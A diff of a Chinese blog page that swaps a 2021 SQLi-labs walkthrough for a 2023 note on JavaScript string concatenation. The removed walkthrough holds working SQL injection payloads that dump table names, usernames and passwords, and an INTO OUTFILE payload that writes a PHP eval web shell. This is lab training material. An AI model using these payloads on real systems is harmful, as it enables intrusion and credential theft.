@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="sqlilabs手工注入, java">
+    <meta name="keywords" content="js中处理数组遍历和字符串拼接的几种方法比较, java">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>sqlilabs手工注入 | 伍玖</title>
+    <title>js中处理数组遍历和字符串拼接的几种方法比较 | 伍玖</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -260,12 +260,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/2.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/19.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">sqlilabs手工注入</h1>
+                    <h1 class="description center-align post-title">js中处理数组遍历和字符串拼接的几种方法比较</h1>
                 </div>
             </div>
         </div>
@@ -379,17 +379,9 @@
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                    <div class="article-tag">
-                        
-                            <a href="/tags/web%E5%AE%89%E5%85%A8/">
-                                <span class="chip bg-color">web安全</span>
-                            </a>
-                        
-                            <a href="/tags/sql%E6%B3%A8%E5%85%A5/">
-                                <span class="chip bg-color">sql注入</span>
-                            </a>
-                        
-                    </div>
+                          <div class="article-tag">
+                            <span class="chip bg-color">无标签</span>
+                          </div>
                     
                 </div>
                 <div class="col s5 right-align">
@@ -401,7 +393,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-03-22
+                    2023-03-29
                 </div>
                 
 
@@ -425,66 +417,21 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h2><ul>
-<li><p>判断是否存在注入</p>
-<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sql&#x2F;Less-1&#x2F;?id&#x3D;1&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+                <p>对于数组的遍历和字符串的拼接操作，不同的实现方式确实会对性能产生影响，但这种影响通常是微小的，难以在短时间内对用户产生明显的感知差异。所以在实际的开发过程中，我们更需要考虑代码的可读性和维护性。</p>
+<p>下面简单介绍一下每种实现方式的性能特点：</p>
+<ol>
+<li><p>使用 for 循环和 +&#x3D; 操作符</p>
+<p>这种方式最直接，也最容易理解，但在重复遍历添加字符串片段的过程中，每次都需要重新创建新的字符串，这会不断产生性能瓶颈，尤其在需要处理大量字符串片段的情况下，对内存和 CPU 的消耗都会比较大。</p>
+</li>
+<li><p>使用数组的 join 方法</p>
+<p>使用 join 方法比起直接使用 +&#x3D; 操作符的方式，避免了每次循环都创建新的字符串，这会减缓内存的消耗，但通过 join 方法连接数组元素时，每次遍历后的结果先存在于一个数组中，最后再通过 join 方法组合，这样会对内存占用造成一定的压力，并且如果要处理的数组元素数量过多时，join 方法在连接过程中也会产生性能问题。</p>
+</li>
+<li><p>使用 reduce 方法</p>
+<p>使用 reduce 方法可以避免数组元素先存在于一个数组中的开销，将连接数组元素的操作直接依赖于上一次的计算结果，这样能更高效地处理数组元素，但是 reduce 方法本身也需要在每次遍历时不断地维护一个累积值，这会对 CPU 的性能产生一定的影响。但总体来说，在数组元素过多时，使用 reduce 方法的性能优于使用 join 方法，也要比直接使用 +&#x3D; 操作符的方式快很多。</p>
+</li>
+</ol>
+<p>综上所述，针对不同的需求场景和程序复杂度，可以选择不同的实现方式。在日常开发中，我们更应该注重代码的可读性与维护性，而对于性能问题的解决，应该在实际运行中注意不断优化，而不是一开始就陷入过度优化的状态。</p>
 
-<p>根据报错信息,说明是字符型注入,闭合方式为’</p>
-</li>
-<li><p>猜字段的数量,根据我们传入 id 最终查询到结果的列数</p>
-<pre class="line-numbers language-none"><code class="language-none">?id&#x3D;1&#39;order by 3--+  正常
-?id&#x3D;1&#39;order by 4--+  报错<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-<p>说明字段数为 3</p>
-</li>
-<li><p>报显示位,id 必须是查询不到的数据<br><code>?id=-1&#39; union select 1,2,3--+</code></p>
-<p>显示 2,3 位</p>
-</li>
-<li><p>查询详细信息<br><code>?id=-1&#39; union select 1,concat_ws(&#39;~&#39;,database(),version(),user()),3--+</code><br>当前数据库,数据库版本,当前用户</p>
-</li>
-<li><p>查询具体</p>
-<ul>
-<li><p>数据库 <code>?id=-1&#39; union select 1,group_concat(schema_name),3 from information_schema.schemata--+</code></p>
-</li>
-<li><p>查询数据库对应表<br><code>?id=-1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;security&#39;--+</code></p>
-</li>
-<li><p>查询表中的列<code>?id=-1&#39;union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;users&#39; --+  </code></p>
-</li>
-<li><p>查数据<br><code>?id=-1&#39; union select 1,group_concat(id,0x3a,username,0x3a,password),3 from security.users --+</code></p>
-</li>
-</ul>
-</li>
-</ul>
-<h2 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h2><p>数字型注入</p>
-<p><code>?id=-1 union select 1,group_concat(id,0x3a,username,0x3a,password),3 from users --+</code></p>
-<h2 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h2><p>字符型注入,闭合方式’)</p>
-<p><code>?id=-1&#39;) union select 1,group_concat(id,0x3a,username,0x3a,password),3 from users --+</code></p>
-<h2 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h2><p>字符型注入,闭合方式”)</p>
-<p><code>?id=-1&quot;) union select 1,group_concat(id,0x3a,username,0x3a,password),3 from users --+</code></p>
-<h2 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h2><p>回显始终是”You are in……”,可采用报错注入</p>
-<p>输入单引号测试,字符型注入,闭合方式<code>&#39;</code></p>
-<ul>
-<li><p>爆表名</p>
-<p><code>?id=&#39; and (select extractvalue(1,concat(&#39;~&#39;,(select table_name from information_schema.tables where table_schema=database()))))--+</code></p>
-<p>报错<code>Subquery returns more than 1 row</code> 可以加上 limit 来截取</p>
-<p><code>?id=&#39; and (select extractvalue(1,concat(&#39;~&#39;,(select table_name from information_schema.tables where table_schema=database() limit 0,1))))--+</code></p>
-<p>改变参数,爆出所有表</p>
-</li>
-<li><p>爆字段</p>
-</li>
-<li><p>爆数据</p>
-<p><code>?id=&#39; and (select extractvalue(1,concat(&#39;~&#39;,(select concat_ws(&#39;~&#39;,id,password) from users limit 0,1))))--+</code></p>
-</li>
-</ul>
-<h2 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h2><p>双引号闭合,操作同 Less-5</p>
-<h2 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h2><p><code>?id=1</code>由回显结果提示知使用 outfile 函数</p>
-<p>判断注入点,<code>&#39;))&#39;</code>闭合</p>
-<p>首先通过前面的关卡查出数据库相关参数<code>/Less-1/?id=-1&#39; union select 1,@@datadir,@@secure_file_priv --+</code></p>
-<p>首先在 mysql 配置文件内加入<code>secure_file_priv=&quot;&quot;</code></p>
-<p>写入一句话木马</p>
-<p><code>?id=&#39;)) union select 1,2,&quot;&lt;?php @eval($_POST[&#39;pass&#39;]);?&gt;&quot; into outfile &quot;E:/phpstudy_pro/www/sqli/Less-7/2.php&quot; --+</code></p>
-<p>可以看到,在目标目录下有了 2.php 的文件,使用蚁剑连接</p>
-<h2 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h2>
                 
             </div>
             <hr/>
@@ -510,7 +457,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://wujiu0.github.io/2021/03/22/sqlilabs%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5/">http://wujiu0.github.io/2021/03/22/sqlilabs%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5/</a>
+                    <a href="http://wujiu0.github.io/2023/03/29/js%E4%B8%AD%E5%A4%84%E7%90%86%E6%95%B0%E7%BB%84%E9%81%8D%E5%8E%86%E5%92%8C%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%8B%BC%E6%8E%A5%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95%E6%AF%94%E8%BE%83/">http://wujiu0.github.io/2023/03/29/js%E4%B8%AD%E5%A4%84%E7%90%86%E6%95%B0%E7%BB%84%E9%81%8D%E5%8E%86%E5%92%8C%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%8B%BC%E6%8E%A5%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95%E6%AF%94%E8%BE%83/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -547,15 +494,7 @@
                 <div class="post-meta__tag-list" style="display: inline-block;">
                     
                         <div class="article-tag">
-                            
-                                <a href="/tags/web%E5%AE%89%E5%85%A8/">
-                                    <span class="chip bg-color">web安全</span>
-                                </a>
-                            
-                                <a href="/tags/sql%E6%B3%A8%E5%85%A5/">
-                                    <span class="chip bg-color">sql注入</span>
-                                </a>
-                            
+                            <span class="chip bg-color">无标签</span>
                         </div>
                     
                 </div>
@@ -725,62 +664,18 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2021/04/09/DVWA-SQL-Injection/">
+                <a href="/2023/03/29/js%E4%B8%AD%E5%A4%84%E7%90%86%E6%95%B0%E7%BB%84%E9%81%8D%E5%8E%86%E5%92%8C%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%8B%BC%E6%8E%A5%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95%E6%AF%94%E8%BE%83/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/50.jpg" class="responsive-img" alt="DVWA-SQL Injection">
+                        <img src="/medias/featureimages/19.jpg" class="responsive-img" alt="js中处理数组遍历和字符串拼接的几种方法比较">
                         
-                        <span class="card-title">DVWA-SQL Injection</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            
-                        
-                    </div>
-                    <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-04-09
-                        </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-user fa-fw"></i>
-                            Wujiu
-                            
-                        </span>
-                    </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/DVWA/">
-                        <span class="chip bg-color">DVWA</span>
-                    </a>
-                    
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/2021/03/22/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/14.jpg" class="responsive-img" alt="sql注入基础知识">
-                        
-                        <span class="card-title">sql注入基础知识</span>
+                        <span class="card-title">js中处理数组遍历和字符串拼接的几种方法比较</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -791,7 +686,7 @@
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-03-22
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-03-29
                             </span>
                         <span class="publish-author">
                             
@@ -801,17 +696,43 @@
                         </span>
                     </div>
                 </div>
+
                 
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/web%E5%AE%89%E5%85%A8/">
-                        <span class="chip bg-color">web安全</span>
-                    </a>
-                    
-                    <a href="/tags/sql%E6%B3%A8%E5%85%A5/">
-                        <span class="chip bg-color">sql注入</span>
-                    </a>
-                    
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2023/03/03/hellowo/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/28.jpg" class="responsive-img" alt="hellowo">
+                        
+                        <span class="card-title">hellowo</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-03-03
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            Wujiu
+                            
+                        </span>
+                    </div>
                 </div>
                 
             </div>
